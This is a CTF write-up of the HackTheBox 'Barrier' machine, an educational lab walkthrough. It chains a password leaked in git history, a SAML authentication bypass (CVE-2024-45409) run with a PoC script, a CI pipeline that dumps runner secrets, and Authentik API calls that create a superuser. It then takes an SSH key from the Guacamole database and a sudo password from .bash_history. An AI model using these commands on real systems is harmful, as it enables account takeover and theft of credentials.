---
title: "HTB: Barrier (Linux Medium)"
date: 2026-07-16
tags: ["ctf", "htb", "linux", "sso", "gitlab", "authentik", "cve-2024-45409"]
description: "Full writeup for HackTheBox Barrier. A leaked GitLab credential, a SAML authentication bypass (CVE-2024-45409), CI/CD runner abuse, an Authentik API takeover, and some credential reuse to get to root."
ShowToc: true
TocOpen: false
draft: false
---

## Machine Profile

Barrier is a Linux box that's built around SSO. Almost everything on it goes through
an identity provider called Authentik. The intended path is a chain of things
trusting each other a little too much: a signature bug in GitLab's SAML, a CI runner
that leaks its own environment, an Authentik API token that really shouldn't be
reachable, and at the end just plain password reuse. None of the steps are exotic on
their own. They just stack up really nicely here, which is what made it fun in my
opinion.

```text
OS:         Ubuntu 22.04.5 LTS
Difficulty: Medium
Themes:     GitLab, SAML/SSO, Authentik, CI/CD, Guacamole
```

**Attack path at a glance:**

1. Leaked `satoru` password in a public GitLab repo's commit history.
2. SAML authentication bypass (CVE-2024-45409) to log in as GitLab admin `akadmin`.
3. Abuse a GitLab CI/CD runner to dump the host environment and grab the Authentik API token.
4. Use the Authentik API to create our own superuser.
5. Impersonate `maki`, ride an existing Guacamole session to a shell, and get the user flag.
6. Loot Guacamole's MySQL DB for `maki_adm`'s SSH key, then reuse a password from `.bash_history` to get root.

---

## Reconnaissance

Let's start with a full TCP scan to map the whole surface before we narrow down:

```bash
nmap -p- -sCV --open -oA scan/barrier <IP>
```

The interesting ports:

| Port | Service | Notes |
|------|---------|-------|
| 22 | SSH | OpenSSH |
| 80 | HTTP | Redirects to `https://gitlab.barrier.vl` |
| 443 | HTTPS | GitLab Community Edition |
| 8080 | HTTP-Proxy | Apache Tomcat (default page) |
| 9000 | cslistener | Authentik **API** (worth remembering) |
| 9443 | tungsten-https | Authentik (default self-signed cert) |

A couple of things stand out right away. Ports 80 and 443 both redirect to
`gitlab.barrier.vl`, so GitLab is front and center. There are also two Authentik
ports (9000 and 9443) sitting next to GitLab and Tomcat. Seeing an identity provider
glued onto a bunch of apps like this pretty much tells us the box is going to be
about SSO, which turns out to be exactly right.

Add the hostnames so the redirects and the tooling resolve by name instead of IP:

```bash
echo "10.129.234.46 gitlab.barrier.vl barrier.vl" | sudo tee -a /etc/hosts
```

---

## GitLab

Browsing to `https://gitlab.barrier.vl` drops us on the GitLab sign-in page. Down at
the bottom there's an `Explore` link that lists public projects without needing to
log in. That's always the first thing I check on a self-hosted GitLab.

There's one public repo, `gitconnect`, owned by a user called `satoru`. Inside is a
short Python script that logs into the GitLab API and lists repo activity:

```python
def get_gitlab_repos():
    base_url = 'https://gitlab.barrier.vl'
    api_url  = urljoin(base_url, '/api/v4/')

    auth_data = {
        'grant_type': 'password',
        'username': 'satoru',
        'password': '***'
    }
```

The password is redacted to `'***'` in the current version. But this is a git repo,
and secrets that get scrubbed out almost always still live in the history somewhere.
Opening the latest commit shows exactly that:

```diff
@@ -10,7 +10,7 @@ def get_gitlab_repos():
     auth_data = {
         'grant_type': 'password',
         'username': 'satoru',
-        'password': 'dGJ2V72SUEMsM3Ca'
+        'password': '***'
     }
```

The commit that "removed" the password is the one that leaks it. Those creds
(`satoru:dGJ2V72SUEMsM3Ca`) still work and log us straight into GitLab.

There isn't much else in the account, but the **Members > Invite members** dialog on
the `gitconnect` project auto-completes usernames as you type. Poking at it turns up
another account: `akadmin`. That's about all GitLab gives us for now, but keep that
name in mind, because it's the one we're going to go after.

---

## Apache Tomcat

Port 8080 serves the default Apache Tomcat splash page. Nothing we can use directly,
and `/manager` wants credentials we don't have. So let's fuzz for other endpoints:

```bash
ffuf -u http://barrier.vl:8080/FUZZ \
     -w /usr/share/seclists/Discovery/Web-Content/directory-list-lowercase-2.3-big.txt -ic
```

```text
manager     [Status: 302, Size: 0, ...]
guacamole   [Status: 302, Size: 0, ...]
```

`/manager` we can't touch, but `/guacamole` throws a 302 and redirects us over to
Authentik on port 9443. Apache Guacamole is a clientless remote desktop gateway, so
if we can get into it, that's a pretty good path to a shell on the box. The fact that
it hands login off to Authentik also lines up with the whole SSO thing.

---

## Authentik

Authentik is an open source identity provider and SSO service. Hitting `/guacamole`
bounces us over to its login page that says "Login to continue to Guacamole." The
`satoru` credentials we already grabbed work here too. That's the whole point of SSO:
one set of creds gets you into everything that's wired up to it.

The Authentik dashboard shows two apps: Gitlab and Guacamole. Clicking a tile runs
the SSO flow and logs us into that app. Guacamole opens fine, but `satoru` doesn't
have any existing connections, so there's nothing to remote into yet. We're going to
need more access first.

---

## Foothold: SAML Authentication Bypass (CVE-2024-45409)

The GitLab `/help` page tells us this is **GitLab Community Edition v17.3.2**, and a
quick search shows that version has a good one: **CVE-2024-45409**, a SAML
authentication bypass in the `ruby-saml` library GitLab uses for SSO.

The idea behind it is kind of fun. Normally a SAML login works because the identity
provider, Authentik in our case, signs a little chunk of XML that says "yep, this is
satoru," and GitLab trusts that signature and lets you in. The catch is that the
signature check is broken. So if you can get hold of one response that Authentik
really signed, you can rearrange the XML around it so it now says "this is akadmin"
instead, and GitLab will still look at that same old signature and go "looks fine to
me." We don't have to forge anything or crack a key. We just need one valid signed
response to mess with.

And getting one is easy, because we're already logged into Authentik. Clicking the
GitLab tile runs the real SSO handshake for us, so if we sit in the middle of it with
Burp, Authentik basically hands us a freshly signed `SAMLResponse` on the way
through.

So let's go grab it. With BurpSuite proxying, click the Gitlab app on the Authentik
dashboard and follow the prompts until you land in GitLab as `satoru`.

Over in Burp's **HTTP history** you'll find the SAML callback. It's a GET request to:

```text
GET /users/auth/saml/callback?SAMLResponse=nVjZkpvKsn3nKxy9HxU2kxCoY9txmUF...
```

Send that to **Repeater** and copy the whole `SAMLResponse` value.

It's not readable yet though. It's URL encoded, then base64, then DEFLATE compressed,
all layered on top of each other. Drop it into CyberChef and chain URL Decode > From
Base64 > Raw Inflate and it turns back into readable `<samlp:Response>` XML. Save that
to a file called `saml.xml`.

Now for the rearranging. We could do the XML surgery by hand, but there's no reason
to, because [Synacktiv](https://github.com/synacktiv/CVE-2024-45409) already wrote a
PoC for exactly this (they're the ones who found the bug). We just point
`CVE-2024-45409.py` at our saved response and tell it we want to be `akadmin`:

```bash
python3 CVE-2024-45409.py -r saml.xml -n akadmin -e -o response.xml
```

```text
[+] Parse response
	Digest algorithm: sha256
	Canonicalization Method: http://www.w3.org/2001/10/xml-exc-c14n#
[+] Remove signature from response
[+] Patch assertion ID
[+] Patch assertion NameID
[+] Patch assertion conditions
[+] Move signature in assertion
[+] Patch response ID
[+] Insert malicious reference
[+] Clone signature reference
[+] Create status detail element
[+] Patch digest value
[+] Write patched file in response.xml
```

You can watch it do all the fiddly bits for us: moving the signature into the
assertion, cloning the reference, repatching the NameID so it reads akadmin. It drops
the finished thing into `response.xml` as a base64 blob that's ready to send.

Last move is just sending it. Pull that blob out of `response.xml`, paste it over the
original `SAMLResponse` in the callback request we've still got waiting in Burp, and
let it go. GitLab hands back two `Set-Cookie` headers. Copy those into the browser,
refresh, and we're in as `akadmin` with full admin.

---

## CI/CD Runner Abuse

As admin we get a whole Admin panel, and the interesting bit is under **CI/CD >
Runners**. There's an existing runner sitting there paused, using a **docker
executor**, tagged `auto_5e7f`.

A docker executor runner spins up a fresh container for every job, runs the pipeline
inside it, then throws the container away when it's done. The important part is that
the container inherits environment variables from the runner. Authentik on this box
runs through docker compose, and its environment holds the Authentik secret and
token, so if we can get the runner to leak its environment, there's a good chance the
Authentik secrets come along with it.

So the plan is simple. Resume the runner, push a pipeline that just runs `env`, and
read whatever the runner is carrying around.

Hit **Resume** on the runner, then create a new blank project. I named mine `test`.
Then add a `.gitlab-ci.yml` that uses an image we know is already on the box. Both
`redis:alpine` and `postgres:16-alpine` get pulled by the Authentik compose stack, so
either one works. We pin the runner tag and just run `env`:

```yaml
image:
  name: redis:alpine
  pull_policy: if-not-present

stages:
  - build

job_build:
  stage: build
  script:
    - env
  tags:
    - auto_5e7f
```

Upload the file and the pipeline starts on its own. Under **Build > Jobs >
job_build**, the log dumps the container's environment, and buried in there is the
token:

```text
AUTHENTIK_TOKEN=MqL8GPTr7y4EDMWsp7gxb2YiKEzuNpLZ2QVia8HD4MLc93vgublgL5xQEvTc
```

And there it is. This is a pretty common lesson. CI runners often carry more secrets
and access than the app they're building for, which makes them a great thing to pivot
through.

---

## Authentik API Takeover

With a valid API token, Authentik is basically ours. Let's confirm it by listing the
users through the API on port 9000:

```bash
curl -L 'http://barrier.vl:9000/api/v3/core/users/' \
  -H 'Authorization: Bearer MqL8GPTr7y4EDMWsp7gxb2YiKEzuNpLZ2QVia8HD4MLc93vgublgL5xQEvTc' | jq
```

That comes back with four accounts: the embedded outpost service account, `akadmin`
(a superuser), `satoru`, and `maki`. It also nicely tells us which users are
superusers and hands us the UUID of the authentik Admins group
(`a38fb983-8b71-4bf2-b5a7-42ab9fdd58e8`).

Instead of hijacking one of the existing admins, it's cleaner to just make our own.
First create a user:

```bash
curl -L 'http://barrier.vl:9000/api/v3/core/users/' \
  -H 'Content-Type: application/json' \
  -H 'Authorization: Bearer MqL8GPTr7y4EDMWsp7gxb2YiKEzuNpLZ2QVia8HD4MLc93vgublgL5xQEvTc' \
  -d '{ "username": "superadmin", "name": "superadmin"}' | jq
```

The response gives our new user a `pk` of 36. The create endpoint won't let us set a
password, but there's a separate one that will:

```bash
curl -L 'http://barrier.vl:9000/api/v3/core/users/36/set_password/' \
  -H 'Content-Type: application/json' \
  -H 'Authorization: Bearer MqL8GPTr7y4EDMWsp7gxb2YiKEzuNpLZ2QVia8HD4MLc93vgublgL5xQEvTc' \
  -d '{ "password": "Pa$$word123!"}'
```

There's no "make this user a superuser" flag either. But superuser status gets
inherited from the authentik Admins group, so we just add our user to that group:

```bash
curl -L 'http://barrier.vl:9000/api/v3/core/groups/a38fb983-8b71-4bf2-b5a7-42ab9fdd58e8/add_user/' \
  -H 'Content-Type: application/json' \
  -H 'Authorization: Bearer MqL8GPTr7y4EDMWsp7gxb2YiKEzuNpLZ2QVia8HD4MLc93vgublgL5xQEvTc' \
  -d '{ "pk": 36}'
```

Listing the users again confirms `superadmin` now shows `"is_superuser": true`.

---

## User Flag: Impersonation and Guacamole

Now we can log into the Authentik web UI at `https://barrier.vl:9443` as
`superadmin:Pa$$word123!`. Since we're a superuser, the **Admin Interface** button
shows up in the top right.

Under **Directory > Users**, every account has an **Impersonate** button. Going
through them, `maki` is the one worth looking at, because `maki` is the account that
has a Guacamole connection set up.

So we impersonate `maki`, open Guacamole, and there's a live **Maintenance**
connection just sitting there ready to go. Opening it drops us into a terminal on the
box as `maki`:

```text
maki@barrier:~$
```

The user flag is in `maki`'s home directory.

---

## Privilege Escalation: Root

Since we came in through Guacamole, its config is the first place I'd look. Guacamole
keeps its config in `/etc/guacamole`:

```text
maki@barrier:/etc/guacamole$ ls -la
drwxr-xr-x   2 root root 4096 ... extensions
-rw-r--r--   1 root root  703 ... guacamole.properties
drwxr-xr-x   2 root root 4096 ... lib
```

`guacamole.properties` holds the MySQL backend credentials:

```properties
# MySQL properties
mysql-hostname: 127.0.0.1
mysql-port: 3306
mysql-database: guac_db
mysql-username: guac_user
mysql-password: guac2024
```

Connect to the database:

```bash
mysql -u guac_user -pguac2024 guac_db
```

Guacamole stores each connection's parameters, including credentials, in the
`guacamole_connection_parameter` table. That's where the good stuff is:

```sql
MariaDB [guac_db]> select * from guacamole_connection_parameter;
```

```text
| 2 | passphrase  | 3V32FN6oViMPxyzC
| 2 | port        | 22
| 2 | private-key | -----BEGIN RSA PRIVATE KEY-----
                    <SNIP>
                    -----END RSA PRIVATE KEY----- |
| 2 | username    | maki_adm
```

So there's a full SSH private key and passphrase for `maki_adm`. Save the key
locally, fix the permissions, and connect. The key is RSA, so on a modern OpenSSH
client you'll need to turn the `ssh-rsa` algorithm back on:

```bash
chmod 600 maki_adm
ssh -i maki_adm maki_adm@barrier.vl -oHostKeyAlgorithms=+ssh-rsa
# passphrase: 3V32FN6oViMPxyzC
```

Now we're in as `maki_adm`, and there's a `.bash_history` that isn't empty, which is
almost always worth a read:

```bash
maki_adm@barrier:~$ cat .bash_history
sudo su
Va4kSjgTHSd55ZLv
```

Someone typed their password straight into the shell right after `sudo su`, so it got
saved to history. That's `maki_adm`'s password, and the `.sudo_as_admin_successful`
file in the home directory is a hint that they can sudo. So let's use it:

```bash
maki_adm@barrier:~$ sudo -i
[sudo] password for maki_adm: Va4kSjgTHSd55ZLv
root@barrier:~#
```

And that's root. The flag is in `/root`.

---

## Tools

`nmap` `ffuf` `seclists` `BurpSuite` `CyberChef`
`python3` `curl` `jq` `mysql` / `mariadb` `ssh` `openssl`
